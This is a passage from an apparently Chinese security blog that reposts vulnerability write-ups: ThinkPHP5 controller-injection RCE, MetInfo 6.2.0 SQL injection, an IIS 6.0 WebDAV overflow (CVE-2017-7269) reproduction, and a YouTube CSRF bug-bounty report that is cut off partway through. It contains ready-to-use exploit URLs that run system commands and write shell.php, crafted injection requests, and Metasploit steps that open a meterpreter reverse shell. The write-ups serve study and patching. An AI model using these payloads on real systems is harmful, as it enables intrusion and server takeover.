<p>这里的<strong>name即为controller</strong>，前置处理为获取到<strong>module,controller,action</strong>，将<strong>controller</strong>传入该函数处理。</p>
<p><strong>当name中存在\时，直接将name赋值到class，不再进行parseClass操作，配合自动加载的机制从而导致可为任意命名空间下的类作为controller，任意public都可被用户访问到，结合ThinkPHP5内置的一些类和方法便可造成远程命令执行。</strong></p>
<h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><p>thinkphp/library/think/App.php 304-320行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">/**</span><br><span class="line"> * 执行函数或者闭包方法 支持参数调用</span><br><span class="line"> * @access public</span><br><span class="line"> * @param string|array|\Closure $function 函数或者闭包</span><br><span class="line"> * @param array                 $vars     变量</span><br><span class="line"> * @return mixed</span><br><span class="line"> */</span><br><span class="line">public static function invokeFunction($function, $vars = [])</span><br><span class="line">&#123;</span><br><span class="line">    $reflect = new \ReflectionFunction($function);</span><br><span class="line">    $args    = self::bindParams($reflect, $vars);</span><br><span class="line"></span><br><span class="line">    // 记录执行信息</span><br><span class="line">    self::$debug &amp;&amp; Log::record(&apos;[ RUN ] &apos; . $reflect-&gt;__toString(), &apos;info&apos;);</span><br><span class="line"></span><br><span class="line">    return $reflect-&gt;invokeArgs($args);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>?s=index/think\app/invokefunction/function/call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</code></p>
<p>ReflectionFunction为PHP中的反射类，反射调用call_user_func_array，call_user_func_array为回调函数，回调system，参数为id</p>
<p><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/thinkphp%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/4.jpg" alt></p>
<p>已知POC(来自t00ls)：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1、?s=index/\think\Request/input&amp;filter=phpinfo&amp;data=1</span><br><span class="line">2、?s=index/\think\Request/input&amp;filter=system&amp;data=id</span><br><span class="line">3、?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=%3C?php%20phpinfo();?%3E</span><br><span class="line">4、?s=index/\think\view\driver\Php/display&amp;content=%3C?php%20phpinfo();?%3E</span><br><span class="line">5、?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</span><br><span class="line">6、?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</span><br><span class="line">7、?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</span><br><span class="line">8、?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</span><br></pre></td></tr></table></figure>
<h2 id="漏洞补丁"><a href="#漏洞补丁" class="headerlink" title="漏洞补丁"></a>漏洞补丁</h2><p><img src="https://raw.githubusercontent.com/allblue147/allblue147.github.io/master/img/%E6%97%A5%E5%B8%B8blog/thinkphp%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/5.jpg" alt></p>
<p>该补丁为<strong>5.0.x</strong>补丁，<strong>5.1.x</strong>位置不一样，方式一样。</p>
<p>补丁方式为限制<strong>controller</strong>只能为字母和数字。并且放在<strong>controller</strong>处理之前。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>简单来说这个洞是由于用户控制了<strong>controller导致的，开发者将处理controller的代码封装到了Loader.php，并且与其他功能进行代码复用，为了满足其他功能增加的功能(即特殊处理存在\的参数)，从而导致了漏洞。代码复用是开发者优质的习惯，但也需要严格审核是否因为书写复用代码时是否会造成漏洞。</strong></p>
<p>另外，可以看到这是一个非常浅显的洞，至今没有人发现，最终由官方爆出，也许很多用户默认此开源框架“流行 == 安全”，其实很多应用并不是想象中的完全安全，漏洞经常发生在被人忽视的地方。</p>
<p>转载于：<a href="https://p0sec.net/index.php/archives/125/" target="_blank" rel="noopener">https://p0sec.net/index.php/archives/125/</a></p>

      
      
    </div>
    
    <div class="article-info article-info-index">
      
      
    <div class="article-category tagcloud">
    <a class="article-category-link" href="/categories/漏洞/">漏洞</a>
    </div>


      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-精品文章/metinfo 6.2.0最新版本前台注入漏洞" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2019/12/07/精品文章/metinfo 6.2.0最新版本前台注入漏洞/" class="article-date">
      <time datetime="2019-12-06T17:03:10.552Z" itemprop="datePublished">2019-12-07</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/12/07/精品文章/metinfo 6.2.0最新版本前台注入漏洞/">metinfo 6.2.0最新版本前台注入漏洞</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <p>metinfo 6.2.0最新版本前台注入漏洞<br><a href="https://nosec.org/home/detail/2436.html" target="_blank" rel="noopener">https://nosec.org/home/detail/2436.html</a><br><a href="https://xz.aliyun.com/t/4508" target="_blank" rel="noopener">https://xz.aliyun.com/t/4508</a></p>
<h2 id="漏洞环境："><a href="#漏洞环境：" class="headerlink" title="漏洞环境："></a>漏洞环境：</h2><p>docker pull zksmile/vul:metinfov6.2.0</p>
<h2 id="概述"><a href="#概述" class="headerlink" title="概述:"></a>概述:</h2><p>看到某个表哥发的metinfo 6.1.3最新注入（<a href="https://xz.aliyun.com/t/4508)，以前我发过metinfo利用注入getshell的文章，这里正好可以结合。（https://nosec.org/home/detail/2324.html)，在检查官方发布的最新版6.2.0版本的时候，发现该漏洞并未修复。" target="_blank" rel="noopener">https://xz.aliyun.com/t/4508)，以前我发过metinfo利用注入getshell的文章，这里正好可以结合。（https://nosec.org/home/detail/2324.html)，在检查官方发布的最新版6.2.0版本的时候，发现该漏洞并未修复。</a></p>
<h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p>前台，（<a href="https://xz.aliyun.com/t/4508" target="_blank" rel="noopener">https://xz.aliyun.com/t/4508</a> ）作者在这里说需要注册会员，其实有一处不需要。漏洞详情<br>这里关键点在auth类的encode()和decode()方法。看下代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">class auth &#123;</span><br><span class="line">    </span><br><span class="line">    public $auth_key;</span><br><span class="line">    </span><br><span class="line">    public function __construct() &#123;</span><br><span class="line">        global $_M;</span><br><span class="line">        $this-&gt;auth_key = $_M[&apos;config&apos;][&apos;met_webkeys&apos;];</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    public function decode($str, $key = &apos;&apos;)&#123;</span><br><span class="line">        return $this-&gt;authcode($str, &apos;DECODE&apos;, $this-&gt;auth_key.$key);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    public function encode($str, $key = &apos;&apos;, $time = 0)&#123;</span><br><span class="line">        return $this-&gt;authcode($str, &apos;ENCODE&apos;, $this-&gt;auth_key.$key, $time);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
<p>这里两个方法全都调用了authcode()方法，跟进authcode看一下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">public function authcode($string, $operation = &apos;DECODE&apos;, $key = &apos;&apos;, $expiry = 0)&#123;</span><br><span class="line">        $ckey_length = 4;  </span><br><span class="line">        $key = md5($key ? $key : UC_KEY);</span><br><span class="line">        $keya = md5(substr($key, 0, 16));</span><br><span class="line">        $keyb = md5(substr($key, 16, 16));</span><br><span class="line">        $keyc = $ckey_length ? ($operation == &apos;DECODE&apos; ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : &apos;&apos;;</span><br><span class="line">        $cryptkey = $keya.md5($keya.$keyc);</span><br><span class="line">        $key_length = strlen($cryptkey);</span><br><span class="line">        $string = $operation == &apos;DECODE&apos; ? base64_decode(substr($string, $ckey_length)) : sprintf(&apos;0d&apos;, $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;</span><br><span class="line">        $string_length = strlen($string);</span><br><span class="line">        $result = &apos;&apos;;</span><br><span class="line">        $box = range(0, 255);</span><br><span class="line">        $rndkey = array();</span><br><span class="line">        for($i = 0; $i &lt;= 255; $i++) &#123;</span><br><span class="line">            $rndkey[$i] = ord($cryptkey[$i % $key_length]);</span><br><span class="line">        &#125;</span><br><span class="line">        for($j = $i = 0; $i &lt; 256; $i++) &#123;</span><br><span class="line">            $j = ($j + $box[$i] + $rndkey[$i]) % 256;</span><br><span class="line">            $tmp = $box[$i];</span><br><span class="line">            $box[$i] = $box[$j];</span><br><span class="line">            $box[$j] = $tmp;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        for($a = $j = $i = 0; $i &lt; $string_length; $i++) &#123;</span><br><span class="line">            $a = ($a + 1) % 256;</span><br><span class="line">            $j = ($j + $box[$a]) % 256;</span><br><span class="line">            $tmp = $box[$a];</span><br><span class="line">            $box[$a] = $box[$j];</span><br><span class="line">            $box[$j] = $tmp;</span><br><span class="line">            $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        if($operation == &apos;DECODE&apos;) &#123;</span><br><span class="line">            if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() &gt; 0) &amp;&amp; substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) &#123;</span><br><span class="line">               return substr($result, 26);</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">               return &apos;&apos;;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            return $keyc.str_replace(&apos;=&apos;, &apos;&apos;, base64_encode($result));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>这里decode和encode算法可逆，但我们需要知道$key的值，查看构造函数：<br>    public function __construct() {<br>        global $_M;<br>        $this-&gt;auth_key = $_M[‘config’][‘met_webkeys’];<br>    }<br>这里$key的值是来源于met_webkeys这个配置，查看met_webkeys来源发现在安装的时候把这个key写入到./config/config_safe.php文件中。<br><img src="http://zone.secevery.com/uploads/article/20190403/d99598b66abb8ca9e201a734af5e1e02.png" alt></p>
<p>查看/config/config_safe.php文件，这里写入方式类似以下，但p牛在某篇文章中说过，这种是无法解析的，php后面必须要有一个空白字符，右键查看源代码即可得到met_webkeys，但有的会报错，根据这个表哥所说和php线程安全有关，本地试了下好像是这样。</p>
<p><img src="http://zone.secevery.com/uploads/article/20190403/cb3d9f13b24af810e1ef6247723a6bf0.png" alt></p>
<p><img src="http://zone.secevery.com/uploads/article/20190403/75cbf499d14fcf3ad354ec5bb3a3b4f7.png" alt></p>
<p>这里有两个利用点，简单说下其中一个。在register类的doemailvild()方法中，这里把用户提交的p参数进行了解密，并且传入到了get_user_valid()方法中。<br><img src="http://zone.secevery.com/uploads/article/20190403/75cbf499d14fcf3ad354ec5bb3a3b4f7.png" alt></p>
<p>查看get_user_valid()方法，这里又把解密后的值传入到了get_user_by_username()方法。</p>
<p><img src="http://zone.secevery.com/uploads/article/20190403/c4128067dcc4aa1ec2838ec2a5a7c7a6.png" alt></p>
<p>查看get_user_by_username()方法，又传入了get_user_by_nameid()方法。</p>
<p><img src="http://zone.secevery.com/uploads/article/20190403/d5cd4c9c4280df13b5938c565ed0bee7.png" alt></p>
<p>查看get_user_by_nameid()方法，直接拼接。</p>
<p><img src="http://zone.secevery.com/uploads/article/20190403/a24becaf370f07a76be572f504c1a804.png" alt></p>
<p>这里基本就清楚了，将auth类的authcode()方法copy本地。</p>
<p><img src="http://zone.secevery.com/uploads/article/20190403/10cfec91217f6204b119ea0d7452d8d4.png" alt></p>
<p>访问本地文件得到加密后的字符串。</p>
<p><img src="http://zone.secevery.com/uploads/article/20190403/dd9db29ebd88dff9ff1c7e0b33d5cc83.png" alt></p>
<p>将加密后的字符串放到cookie，get或者post中，构造请求提交，延时注入成功。</p>
<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>复现时需要注意的点：<br>1、php.ini中 short_open_tag=off</p>
<p>2、不管需不需要登录，最起码需要网站有一个会员存在。</p>
<p><img src="http://zone.secevery.com/uploads/article/20190403/e25e94f1f1e27d8ec673063a6b3b0bdc.png" alt></p>
<p>这里有两个，一个是不需要登陆就可注入，另一个是coolcat表哥所说的需要以会员登陆。以下请自行替换p参数。</p>
<h4 id="1、不需要登陆"><a href="#1、不需要登陆" class="headerlink" title="1、不需要登陆"></a>1、不需要登陆</h4><p>GET /admin/index.php?n=user&amp;m=web&amp;c=register&amp;a=doemailvild HTTP/1.1<br>Cookie: p=00c7%2FDBwD23b41olxVCthTvDDTRBhldmrrdyA8S3t%2F3yAl4QZ0P%2FSfOS5zlB</p>
<h4 id="2、-需要登陆"><a href="#2、-需要登陆" class="headerlink" title="2、 需要登陆"></a>2、 需要登陆</h4><p>GET /admin/index.php?n=user&amp;m=web&amp;c=profile&amp;a=dosafety_emailadd HTTP/1.1</p>
<p>Cookie: p=497cD9UpkDtsvFzU9IKNlPvSyg1z%2bf09cmp8hqUeyJW9ekvPfJqx8cLKFSHr;&lt;自行添加登陆后的cookie&gt;</p>
<h3 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h3><p>目前官网没有更新相关补丁。<br>白帽汇安全研究院建议限制config_safe.php的访问权限来进行应急修复。<br>Apache配置.htaccess文件：</p>
<p><img src="http://zone.secevery.com/uploads/article/20190403/0ec36acdef5643d7d9b87b8963054204.png" alt></p>
<p>Nginx在nginx.conf文件添加以下配置：</p>
<p><img src="http://zone.secevery.com/uploads/article/20190403/cad87ae8e18e3d19c199915e1cc701d9.png" alt></p>
<p>文章转载于：<a href="http://zone.secevery.com/article/1058" target="_blank" rel="noopener">http://zone.secevery.com/article/1058</a></p>

      
      
    </div>
    
    <div class="article-info article-info-index">
      
      
    <div class="article-category tagcloud">
    <a class="article-category-link" href="/categories/漏洞/">漏洞</a>
    </div>


      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-精品文章/CVE-2017-7269 IIS6.0远程代码执行漏洞复现" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2019/12/07/精品文章/CVE-2017-7269 IIS6.0远程代码执行漏洞复现/" class="article-date">
      <time datetime="2019-12-06T17:03:10.547Z" itemprop="datePublished">2019-12-07</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/12/07/精品文章/CVE-2017-7269 IIS6.0远程代码执行漏洞复现/">CVE-2017-7269 IIS6.0远程代码执行漏洞复现</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><p>漏洞编号：CVE-2017-7269<br>发现人员：Zhiniang Peng和Chen Wu（华南理工大学信息安全实验室,计算机科学与工程学院）<br>漏洞简述：开启WebDAV服务的IIS 6.0被爆存在缓存区溢出漏洞导致远程代码执行，目前针对 Windows Server 2003 R2 可以稳定利用，该漏洞最早在2016年7,8月份开始在野外被利用。<br>漏洞类型：缓冲区溢出<br>漏洞等级：高危<br>影响产品：Microsoft Windows Server 2003 R2 开启WebDAV服务的IIS6.0（目前已验证，其他版本尚未验证）<br>触发函数：ScStoragePathFromUrl函数<br>附加信息：ScStoragePathFromUrl函数被调用了两次</p>
<h2 id="复现漏洞"><a href="#复现漏洞" class="headerlink" title="复现漏洞"></a>复现漏洞</h2><p>复现环境：Microsoft Windows Server 2003 R2</p>
<p><img src="http://zone.secevery.com/uploads/article/20190421/a3f037a81fca524ab7e73b07a570a367.png" alt></p>
<p>开启了WebDAV服务</p>
<p><img src="http://zone.secevery.com/uploads/article/20190421/6728f3cc3e99686ee36fd23c44ac9f6c.png" alt></p>
<p>攻击者IP：192.168.1.144<br>目标机IP：192.168.1.175</p>
<p>exp:<a href="https://github.com/zcgonvh/cve-2017-7269" target="_blank" rel="noopener">https://github.com/zcgonvh/cve-2017-7269</a></p>
<p><img src="http://zone.secevery.com/uploads/article/20190421/32ee5fb6e63b209e64303c27d054c216.png" alt></p>
<p>把exp 复制到攻击机器的/usr/share/metasploit-framework/modules/exploits/windows/iis目录下</p>
<p><img src="http://zone.secevery.com/uploads/article/20190421/b5f1712c0adc2eda0a6ed9357f504787.png" alt></p>
<p>打开神器Metasploit</p>
<p><img src="http://zone.secevery.com/uploads/article/20190421/469cf4e103aaa38514880545f9f7f7cc.png" alt></p>
<p>输入use命令，use exploit/windows/iis/cve-2017-7269</p>
<p><img src="http://zone.secevery.com/uploads/article/20190421/9f52f610279f06c9041ddd0c8dd6b064.png" alt></p>
<p>使用命令show options</p>
<p><img src="http://zone.secevery.com/uploads/article/20190421/2d3b6a438a938dd8c02231da8ce4a0d3.png" alt></p>
<p>1.设置目标机ip,set RHOST 192.168.1.175<br>2.设置对面网站，set HttpHost 192.168.1.175<br>3.设置返回载荷，set payload windows/meterpreter/reverse_tcp<br>4.设置攻击机ip，set LHOST 192.168.1.144<br>5.进行溢出，exploit</p>
<p><img src="http://zone.secevery.com/uploads/article/20190421/914441442ce49de5dad761370de3fe0f.png" alt></p>
<p>输入shell命令，来到了我们所熟悉的界面</p>
<p><img src="http://zone.secevery.com/uploads/article/20190421/e530373752927a0db121aaffd1bab50a.png" alt></p>
<p>执行命令whoami</p>
<p><img src="http://zone.secevery.com/uploads/article/20190421/7c0533aea664a63ce89bfd8e600a8b24.png" alt></p>
<h2 id="修复意见"><a href="#修复意见" class="headerlink" title="修复意见"></a>修复意见</h2><p>2015年7月15日，微软已停止对Windows Server 2003的支持，所以官方没有相关解决方案，建议用户升级到最新系统 Windows Server 2016。如果不进行升级的话，请直接关闭WebDAV服务防止漏洞被利用。</p>
<p>转载于：<a href="http://zone.secevery.com/article/1070" target="_blank" rel="noopener">http://zone.secevery.com/article/1070</a></p>

      
      
    </div>
    
    <div class="article-info article-info-index">
      
      
    <div class="article-category tagcloud">
    <a class="article-category-link" href="/categories/漏洞/">漏洞</a>
    </div>


      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-精品文章/CSRF漏洞劫持Youtube用户的通知消息" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2019/12/07/精品文章/CSRF漏洞劫持Youtube用户的通知消息/" class="article-date">
      <time datetime="2019-12-06T17:03:10.542Z" itemprop="datePublished">2019-12-07</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2019/12/07/精品文章/CSRF漏洞劫持Youtube用户的通知消息/">【转]CSRF漏洞劫持Youtube用户的通知消息</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <p><img src="http://zone.secevery.com/uploads/article/20190428/d37776aa90dc7e5c8c9d9a078b3ad77e.jpg" alt></p>
<p>大家好，今天分享的writeup是关于YouTube通知服务（Notification）的CSRF漏洞，作者利用该漏洞可以劫持其他YouTube用户（受害者）的通知服务，能以受害者用户身份接收到其订阅频道或视频的最新通知，漏洞最终获得Google官方$3133.7美金的奖励，以下是作者的分享</p>
<p><strong> 从POST请求中发现端倪</strong><br>某天晚上，我在YouTube官网上测试漏洞，看看能有什么发现，不知不觉时间已经是半夜00:30了，困累之极…..。我就随便点点打开了YouTube的通知服务（Notification），其中的POST请求引起了我的注意：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">POST /notifications_ajax?action_register_device=1 HTTP/1.1</span><br><span class="line">Host: www.youtube.com</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Language: en-US,en;q=0.5</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: https://www.youtube.com/sw.js</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------41184676334</span><br><span class="line">Origin: https://www.youtube.com</span><br><span class="line">Content-Length: 1459</span><br><span class="line">Connection: close</span><br><span class="line">Cookie: duh, cookies!</span><br><span class="line">-----------------------------41184676334</span><br><span class="line">Content-Disposition: form-data; name=&quot;endpoint&quot;</span><br><span class="line"></span><br><span class="line">https://updates.push.services.mozilla.com/wpush/v1/gAAA...</span><br><span class="line"></span><br><span class="line">-----------------------------41184676334</span><br><span class="line">Content-Disposition: form-data; name=&quot;device_id&quot;</span><br><span class="line">dbe8453d99714c6160994fdf5bb3c59332df04278a...</span><br><span class="line">-----------------------------41184676334</span><br><span class="line">Content-Disposition: form-data; name=&quot;p256dh_key&quot;</span><br><span class="line">BBNVkVOt6tpY1KvJJqtLvqt...</span><br><span class="line">-----------------------------41184676334</span><br><span class="line">Content-Disposition: form-data; name=&quot;auth_key&quot;</span><br><span class="line">V5-_lh6nYT2zoY...</span><br><span class="line">-----------------------------41184676334</span><br><span class="line">Content-Disposition: form-data; name=&quot;permission&quot;</span><br><span class="line">granted</span><br><span class="line">-----------------------------41184676334--</span><br></pre></td></tr></table></figure></p>
<p> 乍一看，为了防止CSRF，其中的auth_key、p256dh_key、endpoint、device_id等参数貌似都是经过编码的字符串，但仔细一分析才知道，这些所有的参数都是由其中updates.push.services.mozilla.com的Mozilla通知推送服务产生的，所以，这样初略来看，该接口上不存在CSRF漏洞。</p>
<h3 id="分析Service-Worker-服务工作线程​"><a href="#分析Service-Worker-服务工作线程​" class="headerlink" title="分析Service Worker 服务工作线程​"></a>分析Service Worker 服务工作线程​</h3><p>深入分析可知，上述POST请求中的referrer字段值为“<a href="https://www.youtube.com/sw.js”,这个sw.js明显为一个服务工作线程脚本（Service" target="_blank" rel="noopener">https://www.youtube.com/sw.js”,这个sw.js明显为一个服务工作线程脚本（Service</a> Worker）。</p>
<p>Service Worker 是独立于当前页面的一段运行在浏览器后台进程里的脚本。Service Worker不需要用户打开 web 页面，也不需要其他交互，异步地运行在一个完全独立的上下文环境，不会对主线程造成阻塞。基于Service Worker可以实现消息推送、离线缓存和后台同步API等功能，本质上来说，Service Worker充当了Web应用程序与浏览器之间的代理。​</p>
<p>也就是说，referrer字段中的sw.js发起了这个POST请求，以至于这个请求和其它具备CSRF防御机制的YouTube请求内容存在不同。</p>
<h3 id="构造CSRF攻击框架​"><a href="#构造CSRF攻击框架​" class="headerlink" title="构造CSRF攻击框架​"></a>构造CSRF攻击框架​</h3><p>到了这一步，从这些参数里，我隐约觉得这里应该会有漏洞出现，但总要构造个PoC出来试试看。因此，通过研究以上参数的生成机制，我利用sw.js原理，编写了以下三个代码文件，构建了一个本地服务端来生成其中的各个参数。 </p>
<p><strong>index.html:</strong></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot; /&gt;</span><br><span class="line">    &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;IE=edge&quot;&gt;</span><br><span class="line">    &lt;title&gt;Push Demo&lt;/title&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1&quot;&gt;</span><br><span class="line">    &lt;link rel=&quot;stylesheet&quot; type=&quot;text/css&quot; media=&quot;screen&quot; href=&quot;index.css&quot; /&gt;</span><br><span class="line">    &lt;script src=&quot;index.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;Hello World&lt;/h1&gt;</span><br><span class="line">    &lt;button id=&quot;permission-btn&quot; onclick=&quot;main()&quot;&gt;Ask Permission&lt;/button&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br><span class="line">index.js：</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">const check = () =&gt; &#123;</span><br><span class="line">  if (!(&apos;serviceWorker&apos; in navigator)) &#123;</span><br><span class="line">    throw new Error(&apos;No Service Worker support!&apos;)</span><br><span class="line">  &#125;</span><br><span class="line">  if (!(&apos;PushManager&apos; in window)) &#123;</span><br><span class="line">    throw new Error(&apos;No Push API Support!&apos;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">const registerServiceWorker = async () =&gt; &#123;</span><br><span class="line">  const swRegistration = await navigator.serviceWorker.register(&apos;sw.js&apos;)</span><br><span class="line">  return swRegistration</span><br><span class="line">&#125;</span><br><span class="line">const requestNotificationPermission = async () =&gt; &#123;</span><br><span class="line">  const permission = await window.Notification.requestPermission()</span><br><span class="line">  if (permission !== &apos;granted&apos;) &#123;</span><br><span class="line">    throw new Error(&apos;Permission not granted for Notification&apos;)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">const main = async () =&gt; &#123;</span><br><span class="line">  check()</span><br><span class="line">  const swRegistration = await registerServiceWorker()</span><br><span class="line">  const permission = await requestNotificationPermission()</span><br><span class="line">&#125;</span><br><span 